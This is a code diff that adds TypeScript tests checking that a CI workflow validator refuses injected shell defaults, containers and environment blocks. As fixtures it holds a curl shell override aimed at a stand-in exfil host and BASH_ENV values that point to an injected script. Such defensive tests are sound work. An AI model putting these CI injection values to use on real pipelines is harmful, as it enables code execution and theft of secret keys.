@@ -29,8 +29,10 @@ import {
 import { assertHostedQuantumMeasurementWorkflow } from '../hostedQuantumMeasurementWorkflowContract';
 import {
     assertSemanticReviewWorkflow,
+    SEMANTIC_REVIEW_ASSESS_JOB,
     SEMANTIC_REVIEW_ASSESS_STEP,
     SEMANTIC_REVIEW_CHECKOUT_STEP,
+    SEMANTIC_REVIEW_COVERAGE_JOB,
     SEMANTIC_REVIEW_HEAD_EXPRESSION,
     SEMANTIC_REVIEW_KEY_ENV,
     SEMANTIC_REVIEW_KEY_SECRET_EXPRESSION,
@@ -2201,6 +2203,56 @@ describe('health gates workflow contract', () => {
                 () => assertSemanticReviewWorkflow(shellInjection),
                 `a shell override on ${jobId} ${stepName} must be refused`
             ).toThrow('without a shell override');
+        }
+
+        // The rest of the executable-surface class. A workflow- or job-level
+        // `defaults` replaces the shell every `run` step uses, a job or step
+        // `container` re-environments the job that holds the provider key, and a
+        // job or step `env` can set `BASH_ENV` for a command whose text is pinned.
+        // The snapshot is regenerated as a matter of course, so it cannot be the
+        // only pin for any of them.
+        const workflowDefaults = structuredClone(semanticReviewWorkflow);
+        workflowDefaults.defaults = { run: { shell: 'bash -c "curl -s https://exfil.example"' } };
+        expect(() => assertSemanticReviewWorkflow(workflowDefaults)).toThrow('no workflow-level defaults');
+
+        const workflowEnvironment = structuredClone(semanticReviewWorkflow);
+        recordAt(workflowEnvironment, 'env').BASH_ENV = '/tmp/inject.sh';
+        expect(() => assertSemanticReviewWorkflow(workflowEnvironment)).toThrow('its pinned workflow environment');
+
+        for (const jobId of [SEMANTIC_REVIEW_ASSESS_JOB, SEMANTIC_REVIEW_COVERAGE_JOB] as const) {
+            const jobLabel = jobId === SEMANTIC_REVIEW_ASSESS_JOB ? 'the assessment job' : 'the coverage job';
+            for (const [key, value] of [
+                ['defaults', { run: { shell: 'bash -c "curl -s https://exfil.example"' } }],
+                ['container', { image: 'node:24', env: { BASH_ENV: '/tmp/inject.sh' } }],
+                ['env', { BASH_ENV: '/tmp/inject.sh' }],
+            ] as const) {
+                const injected = structuredClone(semanticReviewWorkflow);
+                jobAt(injected, jobId)[key] = value;
+                expect(
+                    () => assertSemanticReviewWorkflow(injected),
+                    `a job ${key} block on ${jobId} must be refused`
+                ).toThrow(`${jobLabel} without a job ${key} block`);
+            }
+        }
+
+        for (const [jobId, stepName] of [
+            [SEMANTIC_REVIEW_ASSESS_JOB, 'Report the assessment'],
+            [SEMANTIC_REVIEW_COVERAGE_JOB, 'Publish the withheld paths'],
+        ] as const) {
+            const jobLabel = jobId === SEMANTIC_REVIEW_ASSESS_JOB ? 'the assessment job' : 'the coverage job';
+            const containerStep = structuredClone(semanticReviewWorkflow);
+            stepNamed(jobAt(containerStep, jobId), stepName).container = { image: 'node:24' };
+            expect(
+                () => assertSemanticReviewWorkflow(containerStep),
+                `a step container on ${jobId} ${stepName} must be refused`
+            ).toThrow(`${jobLabel} steps without a step container`);
+
+            const envStep = structuredClone(semanticReviewWorkflow);
+            stepNamed(jobAt(envStep, jobId), stepName).env = { BASH_ENV: '/tmp/inject.sh' };
+            expect(
+                () => assertSemanticReviewWorkflow(envStep),
+                `a step env on ${jobId} ${stepName} must be refused`
+            ).toThrow(`${jobLabel} steps without a step environment`);
         }
 
         // The output is read through the step id, so an id that drifts leaves
